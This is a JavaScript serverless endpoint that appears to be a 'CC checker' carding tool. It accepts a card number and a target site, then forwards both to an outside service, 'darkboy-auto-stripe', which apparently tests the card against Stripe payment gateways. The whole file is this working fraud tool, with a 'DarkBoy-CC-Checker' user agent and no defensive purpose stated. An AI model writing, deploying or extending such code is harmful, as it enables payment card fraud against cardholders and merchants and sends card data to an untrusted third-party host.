export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { cc, site } = req.body;

  if (!cc || !site) {
    return res.status(400).json({ error: 'Missing required parameters' });
  }

  try {
    const apiUrl = `https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=${encodeURIComponent(site)}/cc=${encodeURIComponent(cc)}`;
    
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'Accept': 'application/json',
        'User-Agent': 'DarkBoy-CC-Checker/2.0'
      }
    });

    const result = await response.text();
    let jsonResult;
    
    try {
      jsonResult = JSON.parse(result);
    } catch (e) {
      jsonResult = { message: result, status: 'unknown' };
    }

    return res.status(response.status).json(jsonResult);
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
}